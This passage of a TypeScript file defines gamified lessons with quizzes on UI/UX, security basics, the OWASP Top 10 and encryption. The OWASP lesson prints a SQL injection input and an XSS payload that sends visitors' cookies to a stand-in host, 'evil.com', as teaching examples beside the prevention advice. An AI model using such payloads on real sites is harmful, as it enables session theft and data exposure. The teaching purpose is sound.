            explanation: 'Show most important actions directly, hide secondary items in expandable menu. Balance visibility with space.',
        },
        {
            type: 'text',
            text: `✅ UI/UX MASTERCLASS COMPLETE!

KEY PRINCIPLES:

🎯 HEURISTICS: 10 rules for usability
📐 HIERARCHY: Guide the eye with visual priority
🎨 COLOR: 60-30-10 rule, psychology matters
📝 TYPOGRAPHY: Readability over style
🔄 FEEDBACK: Every action gets acknowledgment
📱 RESPONSIVE: Mobile-first, proper breakpoints

DESIGN CHECKLIST:
□ Visual hierarchy is clear
□ Colors support brand and UX goals
□ Text is readable (16px+, high contrast)
□ All states have feedback
□ Works on all screen sizes
□ Follows platform conventions

You've earned 70 XP! 🎓`,
        },
    ],
}

// ========================================
// LESSON 6: SECURITY FUNDAMENTALS
// ========================================
export const LESSON_SECURITY_FUNDAMENTALS: LessonContent = {
    id: 'lesson_security_fundamentals',
    title: 'Security Fundamentals',
    rewardXp: 60,
    area: 'security_hub',
    steps: [
        {
            type: 'text',
            text: `🛡️ SECURITY FUNDAMENTALS

Welcome to the Security Hub! Here you'll learn the basics of cybersecurity.

Why is Security important?
• Data breaches cost millions
• Reputation damage is often irreparable
• Regulations (GDPR, HIPAA) require compliance
• A hacked system = loss of trust

The three pillars of Security:
🔒 CONFIDENTIALITY - Only authorized see data
🔐 INTEGRITY - Data remains unchanged
⚡ AVAILABILITY - Systems are reachable

This triad is the foundation of every security strategy.`,
        },
        {
            type: 'question',
            question: 'What does "Integrity" mean in the Security Triad?',
            options: [
                'Data is always available',
                'Only authorized people can see data',
                'Data remains unchanged and authentic',
                'The system is protected against attacks',
            ],
            correctIndex: 2,
            explanation: 'Integrity ensures that data cannot be changed unnoticed - it remains authentic and trustworthy.',
        },
        {
            type: 'text',
            text: `🔐 AUTHENTICATION VS AUTHORIZATION

Two concepts that are often confused:

AUTHENTICATION (AuthN) - "Who are you?"
• Username + Password
• Biometrics (Fingerprint, Face ID)
• Multi-Factor Authentication (MFA)
• OAuth/OpenID Connect

AUTHORIZATION (AuthZ) - "What can you do?"
• Role-based (RBAC): Admin, User, Guest
• Attribute-based (ABAC): Department, Location
• Permission Lists: Read, Write, Delete
• Least Privilege: Minimum necessary rights

EXAMPLE:
1. Login with password → AuthN checks identity
2. Open dashboard → AuthZ checks permission
3. Admin panel → AuthZ denies (no admin role)`,
        },
        {
            type: 'question',
            question: 'A user has logged in but cannot delete files. Which system is responsible?',
            options: [
                'Authentication - the login was faulty',
                'Authorization - no delete permission',
                'Encryption - the files are protected',
                'Firewall - blocks the action',
            ],
            correctIndex: 1,
            explanation: 'Authorization controls WHAT an authenticated user can do. Here the delete permission is missing.',
        },
        {
            type: 'text',
            text: `🔑 PASSWORD SECURITY

Bad passwords are the #1 entry point for hackers.

PASSWORD RULES:
✅ At least 12 characters
✅ Mix of upper/lower case, numbers, special characters
✅ Unique per service
✅ No personal info (birthday, name)
❌ "password123" - cracked in seconds
❌ Same password everywhere

PASSWORD HASHING (for developers):
• Never store plaintext!
• Use bcrypt, Argon2, scrypt
• Add salt (random data)
• Pepper for extra security

PASSWORD MANAGER:
• Remember one master password
• Generates unique, strong passwords
• Encrypted storage
• Auto-fill prevents phishing`,
        },
        {
            type: 'question',
            question: 'Which hashing algorithm is best suited for passwords?',
            options: [
                'MD5 - fast and widely used',
                'SHA-256 - cryptographically secure',
                'bcrypt - specifically designed for passwords',
                'Base64 - universally applicable',
            ],
            correctIndex: 2,
            explanation: 'bcrypt is specifically developed for passwords, with built-in salt and configurable cost against brute-force.',
        },
        {
            type: 'text',
            text: `✅ SECURITY FUNDAMENTALS COMPLETE!

You have mastered the basics:

🔒 CIA Triad: Confidentiality, Integrity, Availability
🔐 AuthN vs AuthZ: Identity vs Permission
🔑 Password Security: Hashing, Manager, MFA

NEXT STEPS:
→ Learn about OWASP Top 10
→ Understand Encryption
→ Explore Network Security

You earned 60 XP! 🛡️`,
        },
    ],
}

// ========================================
// LESSON 7: OWASP TOP 10
// ========================================
export const LESSON_OWASP_TOP_10: LessonContent = {
    id: 'lesson_owasp_top10',
    title: 'OWASP Top 10',
    rewardXp: 75,
    area: 'security_hub',
    steps: [
        {
            type: 'text',
            text: `⚠️ OWASP TOP 10

The OWASP Top 10 are the most critical security risks for web applications.

OWASP = Open Web Application Security Project
• Non-Profit Community
• Regularly updated (last 2021)
• Industry standard for web security
• Basis for security audits

Die Top 10 (2021):
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Software Integrity Failures
9. Logging Failures
10. Server-Side Request Forgery

Lass uns die wichtigsten durchgehen!`,
        },
        {
            type: 'text',
            text: `💉 INJECTION ATTACKS

SQL Injection - Der Klassiker:

VULNERABLE CODE:
query = "SELECT * FROM users WHERE name='" + userInput + "'"

ATTACK INPUT:
' OR '1'='1' --

RESULT:
SELECT * FROM users WHERE name='' OR '1'='1' --'
→ Returns ALL users!

PREVENTION:
✅ Prepared Statements / Parameterized Queries
✅ ORMs mit automatischem Escaping
✅ Input Validation (Whitelist)
✅ Least Privilege DB-User

BEISPIEL FIX (Node.js):
// FALSCH
db.query("SELECT * FROM users WHERE id=" + userId)

// RICHTIG
db.query("SELECT * FROM users WHERE id=?", [userId])`,
        },
        {
            type: 'question',
            question: 'Which method best protects against SQL Injection?',
            options: [
                'Filter input with regex',
                'Remove all special characters',
                'Prepared Statements with parameters',
                'Hide error messages',
            ],
            correctIndex: 2,
            explanation: 'Prepared Statements separate code from data. User input is never interpreted as SQL code.',
        },
        {
            type: 'text',
            text: `🔓 BROKEN ACCESS CONTROL

#1 in OWASP 2021 - extremely common!

EXAMPLES:
• Manipulate URL: /user/123 → /user/124 (other user's data)
• Change role: role=user → role=admin
• API without auth: GET /api/admin/users
• IDOR: Insecure Direct Object Reference

ATTACK:
1. User A logged in, ID=100
2. Opens /api/orders/500 (Order from User B)
3. Server doesn't check if order belongs to User A
4. User A sees someone else's order!

PREVENTION:
✅ Server-side permission checks
✅ UUIDs instead of sequential IDs
✅ Role-Based Access Control (RBAC)
✅ Deny by default`,
        },
        {
            type: 'question',
            question: 'User changes URL from /profile/123 to /profile/124 and sees someone else\'s data. What vulnerability?',
            options: [
                'SQL Injection',
                'Cross-Site Scripting',
                'Broken Access Control (IDOR)',
                'Cryptographic Failure',
            ],
            correctIndex: 2,
            explanation: 'IDOR (Insecure Direct Object Reference) - the server doesn\'t check if the user is allowed to access this resource.',
        },
        {
            type: 'text',
            text: `🌐 CROSS-SITE SCRIPTING (XSS)

Attacker injects JavaScript into your page.

TYPES:
• Stored XSS: Script stored in database
• Reflected XSS: Script in URL/Request
• DOM-based XSS: Client-side manipulation

EXAMPLE (Stored):
Comment: <script>document.location='evil.com/steal?c='+document.cookie</script>
→ Every visitor sends their cookies to attacker!

PREVENTION:
✅ Output Encoding (HTML entities)
✅ Content Security Policy (CSP)
✅ HttpOnly Cookies (not readable via JS)
✅ Frameworks with Auto-Escaping (React, Vue)

REACT EXAMPLE:
// Safe - automatic escaping
<div>{userComment}</div>

// DANGEROUS - direct HTML
<div dangerouslySetInnerHTML={{__html: userComment}} />`,
        },
        {
            type: 'question',
            question: 'Which HTTP header most effectively protects against XSS?',
            options: [
                'X-Frame-Options',
                'Content-Security-Policy',
                'X-XSS-Protection',
                'Strict-Transport-Security',
            ],
            correctIndex: 1,
            explanation: 'Content-Security-Policy defines allowed script sources and can block inline scripts.',
        },
        {
            type: 'text',
            text: `✅ OWASP TOP 10 COMPLETE!

You now know the most critical risks:

💉 Injection: Use prepared statements
🔓 Broken Access Control: Check server-side
🌐 XSS: Output Encoding + CSP
🔒 Crypto Failures: Modern algorithms
⚙️ Misconfiguration: Secure defaults

CHECKLIST FOR EVERY PROJECT:
□ Authentication robust?
□ Authorization on server?
□ Input validated?
□ Output escaped?
□ Sensitive data encrypted?
□ Dependencies up to date?
□ Logging enabled?

You earned 75 XP! ⚔️`,
        },
    ],
}

// ========================================
// LESSON 8: ENCRYPTION BASICS
// ========================================
export const LESSON_ENCRYPTION_BASICS: LessonContent = {
    id: 'lesson_encryption_basics',
    title: 'Encryption Basics',
    rewardXp: 65,
    area: 'security_hub',
    steps: [
        {
            type: 'text',
            text: `🔐 ENCRYPTION BASICS

Encryption makes data unreadable for unauthorized parties.

BASIC CONCEPTS:
• Plaintext → Encryption → Ciphertext
• Ciphertext → Decryption → Plaintext
• Key: The key for encryption/decryption

TWO MAIN TYPES:

1. SYMMETRIC ENCRYPTION
   • One key for both
   • Fast, efficient
   • Problem: Key exchange
   • Examples: AES, ChaCha20

2. ASYMMETRIC ENCRYPTION
   • Public Key (public) + Private Key (secret)
   • Slower, but secure exchange
   • Basis for TLS, digital signatures
   • Examples: RSA, ECDSA, Ed25519`,
        },
        {
            type: 'question',
            question: 'You want to encrypt a large file. Which algorithm is most efficient?',
            options: [
                'RSA-4096 - maximum security',
                'AES-256 - symmetric and fast',
                'MD5 - widely used',
                'Base64 - universally applicable',
            ],
            correctIndex: 1,
            explanation: 'AES-256 is symmetric and therefore much faster than RSA. Ideal for large amounts of data.',
        },
        {
            type: 'text',
            text: `🌐 TLS/HTTPS

TLS (Transport Layer Security) secures data "in Transit".

HOW HTTPS WORKS:
1. Browser → Server: "Hello, I support TLS 1.3"
2. Server → Browser: Certificate + Public Key
3. Browser verifies certificate (CA chain)
4. Browser generates Session Key
5. Browser encrypts Session Key with Public Key
6. From now on: Symmetric encryption (fast!)

CERTIFICATES:
• Issued by Certificate Authorities (CA)
• Prove server identity
• Let's Encrypt: Free certificates
• Watch expiration dates!

BEST PRACTICES:
✅ Only TLS 1.2 or 1.3
✅ Set HSTS header
✅ No Mixed Content (HTTP in HTTPS)
✅ Certificate Pinning for apps`,
        },
        {
            type: 'question',
            question: 'Why is symmetric encryption used for data in HTTPS?',
            options: [
                'Asymmetric is insecure',
                'Symmetric is much faster',
                'Servers only support symmetric',
                'Certificates require it',
            ],
            correctIndex: 1,
            explanation: 'Asymmetric encryption is ~1000x slower. TLS uses it only for key exchange.',
        },
        {
            type: 'text',
            text: `💾 DATA AT REST

Protect data on disk.

METHODS:
• Full Disk Encryption (FDE): BitLocker, FileVault
• Database Encryption: Transparent Data Encryption
• Application-Level: Encrypt before storing

KEY MANAGEMENT:
• Keys NEVER in code!
• Hardware Security Modules (HSM)
• Cloud KMS (AWS KMS, Azure Key Vault)
• Rotation: Regularly new keys

EXAMPLE (Node.js):
const crypto = require('crypto');

// Encrypt
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
let encrypted = cipher.update(plaintext, 'utf8', 'hex');
encrypted += cipher.final('hex');
const tag = cipher.getAuthTag();

// GCM provides authentication + encryption!`,
        },
        {
            type: 'text',
            text: `✅ ENCRYPTION BASICS COMPLETE!

You now understand:

🔑 Symmetric vs Asymmetric
🌐 TLS/HTTPS Handshake
💾 Data at Rest Encryption
🔒 Key Management Basics

ENCRYPTION CHECKLIST:
□ HTTPS everywhere (no HTTP)
□ Enforce TLS 1.2+
□ Encrypt sensitive DB fields
□ Store keys in Vault/KMS
□ Automatically renew certificates
□ No outdated algorithms (MD5, SHA1, DES)

You earned 65 XP! 🔐`,
        },
    ],
}

// Export all lessons
export const ALL_LESSONS: LessonContent[] = [
    LESSON_PROMPTING_MASTERCLASS,
    LESSON_CONTEXT_MASTERY,
    LESSON_STRUCTURED_OUTPUTS,
    LESSON_FEW_SHOT_DEEP,
    LESSON_UI_UX_MASTERCLASS,
    LESSON_SECURITY_FUNDAMENTALS,
    LESSON_OWASP_TOP_10,
    LESSON_ENCRYPTION_BASICS,
]

